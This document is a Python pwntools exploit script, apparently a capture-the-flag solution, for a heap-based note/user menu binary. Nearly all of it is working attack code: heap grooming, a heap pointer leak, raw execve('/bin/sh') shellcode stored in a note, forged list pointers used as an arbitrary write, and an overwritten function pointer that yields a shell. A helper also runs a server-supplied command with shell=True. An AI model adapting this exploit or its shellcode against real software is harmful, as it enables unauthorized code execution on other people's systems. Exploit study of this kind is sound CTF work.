#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from keystone import *
from capstone import *

bin_path = "./mybini"
exe = context.binary = ELF(args.EXE or bin_path)
context.terminal = "alacritty -e".split()
context.log_level = "debug" if args.DEBUG else "info"
_, host, port = "nc host port".split()

libc_path = None
ld_path = None
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None


class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            error(f'"{name}" doesn\'t exist')
            return lambda: ...

        if hasattr(resolved, "address"):
            resolved = getattr(resolved, "address")

            if not resolved & 0xFFF:
                success(term.text.bold_green(f"{name}.address & 0xFFF == 0"))
            else:
                warn(term.text.bold_yellow(f"{name}.address & 0xFFF != 0"))

        info(term.text.blue(f"{name} : {resolved:#x}"))
        return lambda: ...


logx = LogAddressHex()


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    kw["env"] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def fasm(code, pp=True):
    ks = Ks(KS_ARCH_X86, KS_MODE_64 if context.arch == "amd64" else KS_MODE_32)
    if pp:
        code = cpp(code)
    encoding, _ = ks.asm(code)
    return bytes(encoding)


def fdisasm(code, vma=0x0):
    md = Cs(CS_ARCH_X86, CS_MODE_64 if context.arch == "amd64" else CS_MODE_32)
    instructions = []
    for i in md.disasm(code, vma):
        instructions.append("0x{:x}:\t{}\t{}".format(i.address, i.mnemonic, i.op_str))
    return "\n".join(instructions)


def ua(x):
    return int.from_bytes(x, "little")


def se(x):
    return str(x).encode()


def cyc(x):
    n = 8 if context.arch == "amd64" else 4
    return cyclic(x, n=n)


def solve_pow(crib=b"pwn.red"):
    if args.LOCAL:
        return
    with log.progress("Solving PoW..."):
        cmd = p.recvline_contains(crib).decode().strip()
        output = subprocess.check_output(cmd, shell=True)
        p.sendline(output)


gdbscript = """
b *(main+0)
continue
""".format(**locals())


def register(x, level=0xFADAFADA):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"nama:", x)
    p.sendlineafter(b"):", se(level))


def login(x):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"nama:", x)


def edit(x):
    p.sendlineafter(b">", b"0")
    p.sendlineafter(b":", x)


def add(x):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b":", x)


def view(idx):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b":", se(idx))


def delete(idx):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b":", se(idx))


def logout():
    p.sendlineafter(b">", b"4")


p = start()


# heap fengshui to get good address that ends with null byte
# (really just trial and error lol)
for i in range(8):
    register(f"user{i}".encode())
login(b"user7")
for i in range(8):
    add(b"adam")
logout()
for i in range(8, 16):
    register(f"user{i}".encode())
login(b"user9")
for i in range(4):
    add(b"junk")
edit(b"X" * 0x18)
# add(b"test")
logout()
login(b"user14")
edit(b"Y" * 0x10)
logout()
login(b"X" * 0x18)
add(b"test")
logout()
p.sendlineafter(b">", b"3")
p.recvuntil(b"Y" * 0x10)
# name/karbit is adjacent directly to this heap pointer so we can leak it
leak_heap = ua(p.recv(6))
logx.leak_heap

# make /bin/sh shellcode for later
login(b"user1")
add(
    "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
)

info(b"added shell")
logout()

# this is the address of the /bin/sh shellcode
target_shellcode = leak_heap - 0x1058

# make three users, because if we directly overwrite the victim,
# usser pwner is corrupted and crash
register(b"pwner", leak_heap - 0x1000)
register(b"victim", leak_heap - 0x1010)
register(b"ADAMADAM" * 3, leak_heap - 0x1020)

# p.interactive()
# pause()
login(b"pwner")
# p.interactive()
heap_base = leak_heap & ~0xFFF
user0_addr = leak_heap + 0xC90
logx.user0_addr
user0_karbit = user0_addr + 0x10
# pause()

fake_bini_next = user0_addr
user1_vptr_addr = user0_addr + 0x80
fake_bini_curr = user1_vptr_addr
logx.fake_bini_next
logx.fake_bini_curr
logx.user0_karbit

# this is basically arb write primitive
payload = p64(fake_bini_next) + p64(fake_bini_curr) + b"A" * 8 + p64(user0_karbit)
edit(payload[:-1])
# ovw func ptr of ADAMADAM user
add(p64(target_shellcode))

# now because the name is only null byte we just give it random name so we can login
payload = (
    p64(fake_bini_next) + p64(fake_bini_curr + 0x10) + b"A" * 8 + p64(user0_karbit)
)
edit(payload[:-1])
add(b"123")
logout()
# profit
login(b"123")

p.interactive()
